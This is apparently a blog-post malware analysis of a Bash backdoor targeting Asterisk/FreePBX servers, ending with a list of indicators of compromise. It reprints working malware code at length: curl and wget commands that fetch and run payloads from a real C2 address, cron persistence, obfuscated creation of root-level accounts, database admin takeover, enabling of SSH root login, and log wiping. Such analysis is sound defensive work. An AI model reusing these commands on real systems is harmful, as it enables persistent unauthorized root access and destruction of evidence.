---
layout: post
title: "Malware Analysis: FreePBX Bash Backdoor"
date: 2026-05-04
tags: [malware analysis, reverse engineering]
---

# Asterisk/FreePBX Bash Backdoor
## Executive Summary
This report presents a technical analysis of the Bash malware targeting Linux-based servers, specifically **Asterisk** and **FreePBX** servers. The malware's primary goal is to establish a **backdoor** to the system by modifying the **SSH configuration** and enabling remote **root access**. To ensure its persistence, the malware implements a wide range of hidden **Cron tasks** and uses **obfuscation** techniques, such as **nested Base64** and performs extensive defense evasion to hide its activities.

## Technical Analysis
First thing we can see, is this next command: `curl http://45.95.147.178/x -ks | bash` , that uses curl with the flags k (to skip verification of SSL certificates) and s (to activate "slient" mode) to pipe into bash (as a script) the code or text that is on the site http://45.95.147.178/x.
We can search for this URL and find a long bash script, lets start analyzing it:
```
mkdir -p /tmps /tmp /trmp /var/spool/asterisk/tmp 2>/dev/null || true
rm -rf /tmp/devnull24 /tmps/devnull24 /trmp/devnull24 /var/tmp/devnull24 /var/tmps/devnull24 /var/trmp/devnull24 /var/lib/asterisk/bin/devnull24 2>/dev/null || true
rm -rf /tmp/devnull23 /tmps/devnull23 /trmp/devnull23 /var/tmp/devnull23 /var/tmps/devnull23 /var/trmp/devnull23 /var/lib/asterisk/bin/devnull23 2>/dev/null || true
rm -rf /tmp/devnull2 /tmps/devnull2 /trmp/devnull2 /var/tmp/devnull2 /var/tmps/devnull2 /var/trmp/devnull2 /var/lib/asterisk/bin/devnull2 2>/dev/null || true
#rm -rf /tmp/k /tmps/k /tmp/.??* /tmps/.??* /trmp/.??* 2>/dev/null || true
# ============================================
cd /tmp 2>/dev/null; awk -F: '($3 == 0 || $3 >= 1000) && $1 != "root" {system("userdel -rf " $1 " 2>/dev/null; sed -i \"/^" $1 ":/d\" /etc/passwd /etc/shadow /etc/group /etc/gshadow; rm -rf /home/" $1 " 2>/dev/null")}' /etc/passwd
# ============================================
mysql -u root --password='' asterisk -e "DELETE FROM ampusers WHERE username != 'admin'; INSERT INTO ampusers SET username='freepbxusers', sections='*', password_sha1='6ea9c6d2d932532a4cd44c7974fb1a0a87dbfcf9';" 2>/dev/null || true
# ============================================
mysql -u root --password='' asterisk -e "DELETE FROM ampusers WHERE username NOT IN ('admin', 'freepbxusers'); UPDATE ampusers SET password_sha1='6ea9c6d2d932532a4cd44c7974fb1a0a87dbfcf9', sections='*' WHERE username='admin'; INSERT INTO ampusers (username, password_sha1, sections) VALUES ('freepbxusers', '6ea9c6d2d932532a4cd44c7974fb1a0a87dbfcf9', '*') ON DUPLICATE KEY UPDATE password_sha1='6ea9c6d2d932532a4cd44c7974fb1a0a87dbfcf9', sections='*';" 2>/dev/null || true
# ============================================
```
So, we can see in the first 4 rows, the script creates some dircetorys (with fail-safe method), and then deletes a bunch of directorys.
After that, we change directory to `/tmp`, and then checks the data in `/etc/passwd` for if the third element spereted by ':' **(the UID) is equal to 0 or greater then 1000,** and if the first element **(the username) is not "root"** , and if it the condition is true, it **deletes the user** and cleans up various system files associated with that user.

Now, we use **MySQL**, the script logs on to the 'asterisk' data base with the 'root' username and no password, and deletes from ampusers (some table in the data) ALL the users that are not 'admin' or 'freepbxusers' , and then updates the admin's password and sets its sections field to * (full access), inserts a new freepbxusers user (or updates it if it already exists) with the specified SHA-1 password and sections set to * and then silences any errors and ensures the command completes even if there’s an issue.

```
# malicious files removal
{
    grep -r --include="*.php" -l -E "(eval.*base64_decode|/\*[A-Za-z0-9]+\*/eval|system\(\\\$_GET\[)|eval\(\\\$_POST|eval\(\\\$_REQUEST|eval\(\\\$_GET|system\(\\\$c\s" /var/www/html/ 2>/dev/null
    grep -rE --include="*.php" "PGZvcm0gYWN0aW9uPSIiIG1ldGhvZD0icG9zdCIgPgo8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iY21kIiBzaXplPSc4MCcgLz4KICAgIDxpbnB1dCB0eXBlPSJzdWJtaXQiIG5hbWU9ImV4ZWN1dGUiIHZhbHVlPSJFeGVjdXRlIiAvPiA8aHIgLz4KPC9mb3JtPg" /var/www/html/ 2>/dev/null | cut -d ':' -f1
    grep -rE --include="*.php" "New-Pbx" /var/www/html/ 2>/dev/null | cut -d ':' -f1
    grep -rE --include="*.php" "Emad__Was__Here" /var/www/html/ 2>/dev/null | cut -d ':' -f1
    grep -rE --include="*.php" "VictamPbx" /var/www/html/ 2>/dev/null | cut -d ':' -f1
    grep -rE --include="*.php" "t3rr0r" /var/www/html/ 2>/dev/null | cut -d ':' -f1
    grep -rE --include="*.php" "Hacked" /var/www/html/ 2>/dev/null | cut -d ':' -f1
    grep -rE --include="*.php" "b374k" /var/www/html/ 2>/dev/null | cut -d ':' -f1
    grep -rE --include="*.php" "PGZvcm0gYWN0aW9uPSIiIG1ldGhvZD0icG9zdCIgPjxpbnB1dCBzaXplPTIwIHR5cGU9cGFzc3dvcmQgbmFtZT0icCIgLz48aW5wdXQgc2l6ZT02MCB0eXBlPXRleHQgbmFtZT0iYyIgLz48aW5wdXQgdHlwZT1zdWJtaXQgdmFsdWU9IkhhY2tlZCIgLz48L2Zvcm0" /var/www/html/ 2>/dev/null | cut -d ':' -f1
    grep -rE --include="*.php" "Black Ban V1.01" /var/www/html/ 2>/dev/null | cut -d ':' -f1
    grep -rE --include="*.php" "c2Vzc2lvbl9zdGFydCgpOwppZiAoaXNzZXQoJF9SRVFVRVNUWydtZDUnXSkgJiYgbWQ1KCRfUkVRVUVTVFsnbWQ1J10pID09ICdiNmJhMGZlNDgxOWI2NWUzOTZlNzEzNzg1YjI1ODI2ZScpIHsKICAgICRfU0VTU0lPTlsnbG9va2knXSA9ICdsb2dnZWQnOwp9CmlmICghaXNzZXQoJF9TRVNTSU9OWydsb29raSddKSkgewogICAgZWNobyAnPGZvcm0gYWN0aW9uPSIiIG1ldGhvZD0icG9zdCI" /var/www/html/ 2>/dev/null | cut -d ':' -f1
    grep -rE --include="*.php" "CnNlc3Npb25fc3RhcnQoKTsKaWYgKGlzc2V0KCRfUkVRVUVTVFsnbWQ1J10pICYmIG1kNSgkX1JFUVVFU1RbJ21kNSddKSA9PT0gJzc1ODY4ZTA4ZGNhNzE4YTVlYmRhYzdmNGU3NjJhODRiJykgewogICAgJF9TRVNTSU9OWydNQUZJQSddID0gJ2xvZ2dlZCc7Cn0KaWYgKCFpc3NldCgkX1NFU1NJT05bJ01BRklBJ10pKSB7CiAgICBlY2hvICc8Zm9ybSBtZXRob2Q9InBvc3QiPjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJtZDUiIHNpemU9IjMyIi8" /var/www/html/ 2>/dev/null | cut -d ':' -f1
} | sort -u | while read file; do
    [ -f "$file" ] && rm -rf "$file" &>/dev/null || true
done
```
Shortly, this code searches for PHP files in `/var/www/html/` that contain malicious patterns or known backdoor signatures and exploits, collects the filenames of these malicious files deletes the malicious files found in the search.

After that we have a long list of searches for all .php files in the `/var/www directory` to find some strings and words (some encoded in base64) like HTML elements, names, bash code, and more payloads, and then deletes the files contatining this strings.
```
# ============================================
mkdir -p /tmps /tmp /trmp /var/spool/asterisk/tmp 2>/dev/null || true
# ============================================
printf '%s' 'dXNlcmFkZCAtcyAvYmluL2Jhc2ggIC1vdSAwIC1nIDAgLXAgJyQxJG5SejFDYnRrJDZEbkdzMzduLk9wUGNnZWpVZnA5cC4nIG5ld2ZwYnhzICY+L2Rldi9udWxs' | base64 -d | bash 2>/dev/null || true
printf '%s' 'dXNlcmFkZCAtcyAvYmluL2Jhc2ggIC1vdSAwIC1nIDAgLXAgJyQxJG5SejFDYnRrJDZEbkdzMzduLk9wUGNnZWpVZnA5cC4nIG5ld2ZwYnggJj4vZGV2L251bGw=' | base64 -d | bash 2>/dev/null || true
printf '%s' 'dXNlcmFkZCAtcyAvYmluL2Jhc2ggIC1vdSAwIC1nIDAgLXAgJyQxJG5SejFDYnRrJDZEbkdzMzduLk9wUGNnZWpVZnA5cC4nIHhoaW1heCAmPi9kZXYvbnVsbA==' | base64 -d | bash 2>/dev/null || true
# ============================================
echo '*/1 * * * * wget -q http://45.95.147.178/k.php -O /var/lib/asterisk/bin/zen222 && bash /var/lib/asterisk/bin/zen222' | crontab - 2>/dev/null || true
echo '*/1 * * * * wget -q http://45.95.147.178/k.php -O /var/lib/asterisk/bin/devnull312 && bash /var/lib/asterisk/bin/devnull312' | crontab - 2>/dev/null || true
echo '*/1 * * * * wget -q http://45.95.147.178/k.php -O /var/lib/asterisk/bin/devnull212 && bash /var/lib/asterisk/bin/devnull212' | crontab - 2>/dev/null || true
echo '*/2 * * * * wget -q http://45.95.147.178/k.php -O /tmp/.cache/update && bash /tmp/.cache/update' | crontab - 2>/dev/null || true
echo '*/3 * * * * wget -q http://45.95.147.178/k.php -O /dev/shm/.systemd/kernel && bash /dev/shm/.systemd/kernel' | crontab - 2>/dev/null || true
# ============================================
```
And now, the script first prints some base64 strings, pipe it into base64 for decode, and then pipes it to bash, so we can guess this strings are more bash commands; when encoded it says: `useradd -s /bin/bash  -ou 0 -g 0 -p '$1$nRz1Cbtk$6DnGs37n.OpPcgejUfp9p.' newfpbxs &>/dev/null`, `useradd -s /bin/bash  -ou 0 -g 0 -p '$1$nRz1Cbtk$6DnGs37n.OpPcgejUfp9p.' newfpbx &>/dev/null` and `useradd -s /bin/bash  -ou 0 -g 0 -p '$1$nRz1Cbtk$6DnGs37n.OpPcgejUfp9p.' xhimax &>/dev/null` .
The first command addes a new user with UID 0 (that does not have to be unique because of the -o flag), GID (group ID) 0, encrypted password of "$1$nRz1Cbtk$6DnGs37n.OpPcgejUfp9p." and username of "newfpbxs". the second and third command do the exact same thing with diffrent passwords and diffrent usernames ("newfpbx" and "xhimax").

And after that, the next 5 commands ,creates a cron job that runs every n (n is 1,2 or 3) minutes (*/n * * * *), downloads the file from http://45.95.147.178/k.php and saves it as /var/lib/asterisk/bin/somename, and then executes the downloaded file with bash. Unexpectedly, this k.php file is the same malware source code... which means it will execute it recursively over and over again (not good...)
```
# ============================================
mkdir -p /tmps /tmp /trmp /var/spool/asterisk/tmp 2>/dev/null || true
RANDOM_PAYLOAD=$(tr -dc 'a-z0-9' </dev/urandom | head -c8)
for dir in /tmps /tmp /trmp; do
    PAYLOAD="${dir}/.${RANDOM_PAYLOAD}"
    (wget -q --no-check-certificate http://45.95.147.178/ -O "$PAYLOAD" || curl -s --insecure -o "$PAYLOAD" http://45.95.147.178/) 2>/dev/null || true
    [ -s "$PAYLOAD" ] && bash "$PAYLOAD" 2>/dev/null || true
done
# ============================================
```
This code creates hidden directories, then generates a random filename for a payload. It attempts to download a malicious script from 45.95.147.178 using either wget or curl, saving it to the random filename. If the download is successful and the file is not empty, it executes the payload using bash.

Now at this point I started checking around for more details because it seems odd to me the just "guess" the payload's filename, so I used **GoBuster** to see what I can find, and I found there /admin /rt /serv directorys and more, and each and every one of them seems the contation some sort of malware or payloads, it looked like an active hackers site, and Im sure there is A LOT more going on there. Anyways, back to the script:
```
# ============================================
find /home -name authorized_keys -exec sed -i '/AAAAB3NzaC1yc2EAAAADAQABAAABAQCLLJeL3g2dbjGE/d' {} \; 2>/dev/null || true
rm -f /root/.ssh/authorized_keys 2>/dev/null || true
# ============================================
for f in /etc/freepbx.conf /etc/asterisk/*.conf /etc/crontab /etc/cron.d/*; do
    [ -f "$f" ] && sed -i "s/62\.171\.157\.156\|178\.214\.77\.7\|45.234\.176\.202\|46\.37\.21\.63\|162\.217\.98\.180\|202\.170\.120\.157\|111\.223\.32\.50/45.95.147.178/g" "$f" 2>/dev/null || true
done
# ============================================
for i in 62.171.157.156 178.214.77.7 45.234.176.202 46.37.21.63 162.217.98.180 172.93.111.169 107.191.47.36 3.89.108.204 37.252.64.234 202.170.120.157 111.223.32.50; do
    iptables -C INPUT -s $i -j DROP 2>/dev/null || iptables -A INPUT -s $i -j DROP 2>/dev/null || true
    iptables -C OUTPUT -d $i -j DROP 2>/dev/null || iptables -A OUTPUT -d $i -j DROP 2>/dev/null || true
done
# ============================================
```
first it removes a specific **SSH key** from any `authorized_keys` files and deletes the `authorized_keys` file in `/root/.ssh`, then it modifies certain configuration files by replacing a list of specific **IP addresses** with redirecting traffic to a malicious server probably, and then it adds **firewall rules** using iptables to block traffic from or to a list of IP addresses.  

After that this script creates multiple **backdoor accounts**, modifies **system configurations** to **ensure persistence**, downloads **additional malicious payloads**, and ensures **root access** is maintained through SSH and **cron jobs**. We can see the hard job being made for persistence.

```
# ============================================
# PERSISTENT PAYLOAD DOWNLOADERS
# ============================================
B64_ZEN2='d2dldCAtcSAtLXRpbWVvdXQ9MSAtLXRyaWVzPTMgaHR0cDovLzQ1Ljk1LjE0Ny4xNzgvay5waHAgLU8gL3Zhci9saWIvYXN0ZXJpc2svYmluL3plbjIgJiYgYmFzaCAvdmFyL2xpYi9hc3Rlcmlzay9iaW4vemVuMg=='
B64_DEVNULL='d2dldCAtcSAtLXRpbWVvdXQ9MSAtLXRyaWVzPTMgaHR0cDovLzQ1Ljk1LjE0Ny4xNzgvay5waHAgLU8gL3Zhci9saWIvYXN0ZXJpc2svYmluL2Rldm51bGwyICYmIGJhc2ggL3Zhci9saWIvYXN0ZXJpc2svYmluL2Rldm51bGwy'
B64_HEAL='Zm9yIGIgaW4gL3Vzci9saWIvLnN5c3RlbWQvLmNhY2hlIC91c3Ivc2hhcmUvLmZvbnRzLy5jb25maWcgL3Zhci9saWIvLmRidXMvLmRhdGEgL3Zhci90bXAvLlgxMS8uWGF1dGhvcml0eSAvb3B0Ly5sb2NhbC8uYmFzaHJjIC92YXIvY2FjaGUvLmZvbnRjb25maWcvLmNmZyAvZXRjLy5zc2wvLmNlcnQgL3Jvb3QvLmNvbmZpZy8ucHJlZjsgZG8gWyAtcyAiJGIiIF0gJiYgY3JvbnRhYiAiJGIiICYmIGJyZWFrOyBkb25l'

{
    crontab -l 2>/dev/null || true
    echo "0 1 * * * /usr/sbin/logrotate /etc/logrotate.conf >/dev/null 2>&1"
    echo "*/1 * * * * /usr/bin/fc-cache -f -v >/dev/null 2>&1"
    echo "0 1 * * * /usr/bin/openssl x509 -in /etc/ssl/certs/ca-certificates.crt -noout -dates >/dev/null 2>&1"
    echo "$((RANDOM%60)) * * * * echo '${B64_ZEN2}' | base64 -d | bash >/dev/null 2>&1"
    echo "$((RANDOM%60)) * * * * echo '${B64_DEVNULL}' | base64 -d | bash >/dev/null 2>&1"
    echo "$((RANDOM%60)) * * * * echo '${B64_HEAL}' | base64 -d | bash >/dev/null 2>&1"
    echo "*/1 * * * * pgrep -f 'zen2|devnull2' >/dev/null 2>&1 || (bash /var/lib/asterisk/bin/zen2 >/dev/null 2>&1 &)"
    echo "*/1 * * * * for b in /usr/lib/.systemd/.cache /usr/share/.fonts/.config /var/lib/.dbus/.data /var/tmp/.X11/.Xauthority /opt/.local/.bashrc; do [ -s \"\$b\" ] && crontab \"\$b\" 2>/dev/null && break; done"
} | crontab - 2>/dev/null || true
```
First we will decode the base64 strings, and get that:

`B64_ZEN2 = wget -q --timeout=1 --tries=3 http://45.95.147.178/k.php -O /var/lib/asterisk/bin/zen2 && bash /var/lib/asterisk/bin/zen2`

`B64_DEVNULL = wget -q --timeout=1 --tries=3 http://45.95.147.178/k.php -O /var/lib/asterisk/bin/devnull2 && bash /var/lib/asterisk/bin/devnull2`

`B64_HEAL = for b in /usr/lib/.systemd/.cache /usr/share/.fonts/.config /var/lib/.dbus/.data /var/tmp/.X11/.Xauthority /opt/.local/.bashrc /var/cache/.fontconfig/.cfg /etc/.ssl/.cert /root/.config/.pref; do [ -s "$b" ] && crontab "$b" && break; done`

So we can see again, this script sets up persistent cron jobs that regularly download and execute malicious scripts, while also attempting to ensure the crontab itself is continuously updated with new malicious jobs, its more and more of the same code, without any goal.

```
# ============================================
# FINAL CLEANUP
# ============================================
find /var/log -name "*.log" -exec sh -c 'cat /dev/null > {}' \; 2>/dev/null
rm -rf /var/log/secure* /var/log/messages* /var/log/auth* /var/log/httpd/* /var/log/nginx/* /var/log/apache2/* 2>/dev/null
history -c 2>/dev/null
unset HISTFILE 2>/dev/null
rm -f ~/.bash_history ~/.zsh_history 2>/dev/null
```
Now, as written in the code, its a final cleanup, the script clears log files, removing specific log files, clearing bash history, unsetting HISTFILE (which prevents further commands from being written to the history file) and deleting history files.


And finally, we finished the first line of the malware source code, for now the main thing it did was creating a lot of users, cron jobs, downloading malicious script (recursively), deleting config, history and users files, and a lot more random code that is ment to confuse us.

After a deep inspection, just the first base64 string contained more base64 strings that contained more base64 strings, that eventually just did more and more random code like creating users ,changing passwords and creating cron jobs. This code was extremly obfuscated and confusing. 
But I did found what I think is the main goal of this malware:
```
system("sed -i 's/^#Port .*/Port 22/' /etc/ssh/sshd_config");
system("sed -i 's/^Port .*/Port 22/' /etc/ssh/sshd_config");
system("iptables -A INPUT -p tcp --dport 22 -j ACCEPT");
system("systemctl restart sshd");
system("sed -i 's/^#PermitRootLogin .*/PermitRootLogin yes/' /etc/ssh/sshd_config");
system("sed -i 's/^PermitRootLogin .*/PermitRootLogin yes/' /etc/ssh/sshd_config");
system("sed -i '/restapps/d' /var/log/httpd/*");
```
This code opens SSH on port 22 and allows root login, with the password the script already changed a thousand times.
I also found this code `system("curl http://45.95.147.178/z/post/root.php|sh");` but it did't really contain any malware it just had the line #!/bin/bash.

## Conclusion
I suspect the ultimate goal of this malware was to **open a backdoor for root access via SSH** while maintaining **continuous re-infection** mechanisms and **eliminating competing threats**, indicating use as part of a larger botnet infrastructure.
The code is very obfuscated and complicated with a lot of base64 and bash nonsense with no purpose and repetitive code that I assume is meant to confuse malware researchers.

## Indicators of Compromise (IOCs)

**C2 Infrastructure (IPv4 & URLs):**
* 45.95.147.178
* [http://45.95.147.178/x](http://45.95.147.178/x)
* [http://45.95.147.178/k.php](http://45.95.147.178/k.php)
* [http://45.95.147.178/z/post/root.php](http://45.95.147.178/z/post/root.php)
* Known C2 Directories: `/admin`, `/rt`, `/serv`

**Blocked/Replaced IP Addresses:**
* `62.171.157.156`, `178.214.77.7`, `45.234.176.202`, `46.37.21.63`, `162.217.98.180`, `172.93.111.169`, `107.191.47.36`, `3.89.108.204`, `37.252.64.234`, `202.170.120.157`, `111.223.32.50`

**Malicious File Paths:**
* `/var/lib/asterisk/bin/zen2`
* `/var/lib/asterisk/bin/zen222`
* `/var/lib/asterisk/bin/devnull2`
* `/var/lib/asterisk/bin/devnull212`
* `/var/lib/asterisk/bin/devnull312`
* `/tmp/.cache/update`
* `/dev/shm/.systemd/kernel`
* `/usr/lib/.systemd/.cache`
* `/var/tmp/.X11/.Xauthority`

**Rogue User Accounts:**
* OS Level (UID 0): `newfpbxs`, `newfpbx`, `xhimax`
* OS Password Hash: `$1$nRz1Cbtk$6DnGs37n.OpPcgejUfp9p.`
* MySQL/Asterisk: `freepbxusers`
* MySQL Password Hash (SHA-1): `6ea9c6d2d932532a4cd44c7974fb1a0a87dbfcf9`

**Targeted SSH Key (Removed):**
* `AAAAB3NzaC1yc2EAAAADAQABAAABAQCLLJeL3g2dbjGE`
